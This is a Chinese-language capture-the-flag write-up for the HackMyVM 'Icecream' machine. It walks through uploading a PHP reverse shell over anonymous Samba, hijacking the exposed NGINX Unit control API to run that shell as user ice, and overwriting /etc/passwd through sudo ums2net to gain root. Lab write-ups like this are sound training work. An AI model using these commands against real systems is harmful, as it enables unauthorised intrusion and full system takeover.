# Icecream

2024-11-03 https://hackmyvm.eu/machines/machine.php?vm=Icecream

## IP

192.168.5.40

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9000/tcp open  cslistener
```

80 的 web 服务上没有信息。

看 139 和 445 的 samba 服务：

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
icecream        Disk      tmp Folder
IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
nobody          Disk      Home Directories
```

smbclient -N //192.168.5.40/icecream 进入后，ls 没发现什么有用文件,对应的是 /tmp 目录，但是对应的有上传功能，上传一个 web shell 看看是否能访问回连，经过测试可以回连：

```
put 8888.php


nc -lvnp 8888
curl http://192.168.5.40/8888.php
```

得到了 www-data 的权限，但是没办法升级到 ice 用户权限，这个路径行不通。

ice 用户运行了 9000 端口的 cslistener 服务，能发现目标系统上的安装软件版本。进行目录扫描，发现如下目录：

```
/config               (Status: 200) [Size: 62]
/status               (Status: 200) [Size: 862]
/certificates         (Status: 200) [Size: 4]

unit: main v1.33.0 [/usr/sbin/unitd --control 0.0.0.0:9000 --user ice]
```

https://unit.nginx.org/controlapi/ 通过下面的代码控制 unitd 的路由功能：

```
利用上面 samba 功能上传一个7777端口的php shell

config.json 中的内容如下：

{
  "listeners": {
    "*:5555": {
      "pass": "routes"
    }
  },
  "routes": [
    {
      "match": {
        "uri": "*"
      },
      "action": {
        "pass": "applications/myapp"
      }
    }
  ],
  "applications": {
    "myapp": {
      "type": "php",
      "root": "/tmp",
      "index": "7777.php",
      "script": "7777.php"
    }
  }
}

curl -X PUT --data-binary @config.json http://192.168.5.40:9000/config

{
	"success": "Reconfiguration done."
}
```

完成上面的路由创建后，在 kali 上访问 curl http://192.168.5.40:5555 就可以得到 php 7777 的回连 shell:

```
ice@icecream:/$ id
id
uid=1000(ice) gid=1000(ice) grupos=1000(ice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```

获得 user flag：

```
ice@icecream:/home/ice$ cat user.txt
HMVaneraseroflove
```

寻找提升至 root 的方法，sudo -l 发现：

```
(ALL) NOPASSWD: /usr/sbin/ums2net
```

在目标机器上创建 config 配置文件: echo '29543 of=/etc/passwd bs=4096' >> config , 然后执行代码：sudo /usr/sbin/ums2net -c config -d

可以通过 ums2net 将 tcp 传输的数据通过 usb 存储到文件，先读取目标文件的 /etc/passwd , 然后在 kali 上创建相同的文件，并且修改 root 用户的密码为 123

```
openssl passwd -1 -salt new 123

root:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

在 kali 上执行 nc 将修改后的 passwd 传输到目标机器： nc -q 5 192.168.5.40 29543 < passwd

传输完成后，使用 su root 输入密码 123 得到了 root 权限，最后获得了 root flag：

```
root@icecream:~# cat root.txt
HMViminvisible
```
